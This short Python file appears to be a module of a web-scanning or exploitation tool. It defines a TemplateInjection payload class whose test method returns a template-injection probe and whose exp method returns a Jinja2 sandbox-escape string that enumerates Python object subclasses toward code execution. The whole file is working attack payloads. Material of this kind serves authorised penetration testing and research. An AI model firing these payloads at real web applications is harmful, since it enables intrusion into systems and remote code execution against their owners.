#!/usr/bin/env python
# -*- coding: utf-8 -*-


from payloads.payload import Payload


class TemplateInjection(Payload):
    """dTemplateInjection"""

    def __init__(self):
        super(TemplateInjection, self).__init__()

    def test(self):
        # simple mathematical expressions
        return "{{ 7*7 }}"

    def exp(self):
        return "{{''.__class__.__mro__[2].__subclasses__()}}"